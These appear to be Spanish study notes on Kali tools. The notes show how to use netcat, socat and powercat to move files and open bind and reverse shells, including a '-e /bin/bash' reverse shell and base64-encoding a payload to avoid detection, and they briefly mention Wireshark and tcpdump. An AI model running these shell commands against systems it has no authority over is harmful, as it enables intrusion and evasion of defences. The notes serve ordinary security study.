# 2. HERRAMIENTAS MÁS IMPORTANTES DE KALI

## 2.1 Netcat
Lee y/o escribe datos de un ordenador a otro usando los puertos UDP y TCP.
        nc -n -v 192.168.1.199, de donde

        -n:  Do not do any DNS or service lookups on any specified addresses,
             hostnames or ports.
        -v:  Produce more detailed output

        nc -nvlp <puerto> : creamos un listener en el puerto indicado

Como curiosidad existe una herramienta llamada rdesktop, que se utiliza para conectarnos de forma remota a un sistema.

### 2.2 Transferir archivos desde un ordenador a otro

Se ejecuta netcat en ambos lados.
- En el receptor, tenemos el listener con 

        nc -nvlp <puerto>  > <nombre del archivo>

- En el que envía:
        
        nc -nv <ip destino> <puerto>  <  <ruta del archivo a compartir>

### 2.3 Redirección con Netcat
Para ello se utiliza el comando 

        nc -e <nombre de fichero>

Existen dos posibilidades: 
1. Realzar un bind desde el que B puede acceder de forma remota a A, siendo este el que ejecuta el comando mencionado.

        A: nc -nlvp <puerto> -e cmd.exe
        B: nc -nv <ip de A>  <puerto>

2. Realizar una shell inversa, en la cual B le propociona a A un acceso a su máquina.

        A: nc -nlvp <puerto> , para escuchar una shell entrante
        B: nc -nc -nv <ip de A>  <puerto> -e /bin/bash


## 2.2 Socat
Muy similar a Netcat
- El que transfiere:
        
        socat - (transferir datos desde estándar i/o) TCP4:<IP del otro disp>:<puerto>
        sudo socat
- El que escucha:

        sudo socat TCP4-LISTENER:<puerto> STDOUT

- Para transferir ficheros, se define:

        sudo socat TCP4-LISTENER:<puerto>, fork file:<fichero> 

- La shell inversa:
    1. El que escucha debe añadir -d -d para añadir robustez.
    2. El que proporciona la shell, deberá añadir EXEC: bin/bash


## 2.3 Poweshell
Un tanto más compleja que las dos anteriores. Los comandos son mucho más complejos y no combiene recordar todos los comandos.

Cada vez que queramos realizar una shell inversa o algo por el estilo, consultamos los comandos por internet.

Powershell también contiene su propia versión de netcat: **Powercat**. Su funcionamiento es muy parecido al de netcat.

Para crear una Bind Shell (esta vez desde powershell), deberemos incluir -l de listener.

Standalone Payloads: Los payloads ejecutables son un set de instrucciones de Powershell, así como el apartado de script de powercat en el cual se especifican el conjunto de acciones que el usuario quiere realizar.

- Se especifica con el comando -g > fichero.ps1 
- En caso de querer cifrarlo en base64 para que no sea detectado, se sustituye -g por -ge en la sentencia anterior


## 2.4 Wireshark 
Con net y la IP, además de la interfaz queremos monitorizar. Es una herramienta excelente para capturar el tráfico que deseemos.

## 2.5 Tcpdump
Se trata de una herramienta ampliamente utilizada. Es un sniffer basado en texto, que puede capturar y analizar paquetes así como también analizar paquetes ya capturados.

        sudo tcpdump -r fichero.pcap
        sudo tcpdump -n <cosas a especificar> -r  ...
